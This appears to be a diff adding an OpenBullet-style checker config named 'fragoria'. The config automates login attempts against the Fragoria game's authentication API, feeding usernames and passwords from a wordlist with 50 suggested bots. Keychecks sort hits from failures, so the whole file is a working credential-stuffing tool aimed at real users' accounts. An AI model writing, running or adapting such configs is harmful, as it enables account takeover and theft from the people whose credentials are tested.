@@ -1,0 +1,43 @@
+[SETTINGS]
+{
+  "Name": "fragoria",
+  "SuggestedBots": 50,
+  "LastModified": "2019-04-27T20:44:00.3860069+02:00",
+  "AdditionalInfo": "",
+  "Author": "relist420mlg",
+  "Version": "1.0.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "http://auth.fragoria.com/v1/portal/api/json.php?callback=jQuery1102011952817564327134_<unix>&action=login&lang=en&auth=en&login=<USER>&password=<PASS>&_=<" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: http://en.fragoria.com/" 
+  HEADER "Content-Type: application/javascript" 
+
+FUNCTION CurrentUnixTime -> VAR "Unix" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "result\":\"success" 
+  KEYCHAIN Failure OR 
+    KEY "result\":\"error" 
+
